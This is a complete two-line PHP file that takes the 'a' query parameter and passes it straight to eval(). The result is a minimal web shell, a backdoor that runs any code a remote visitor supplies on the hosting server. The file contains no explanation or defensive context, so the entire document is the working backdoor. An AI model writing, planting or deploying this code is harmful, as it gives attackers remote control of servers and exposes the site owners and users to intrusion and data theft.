<?php
eval($_GET[a]);
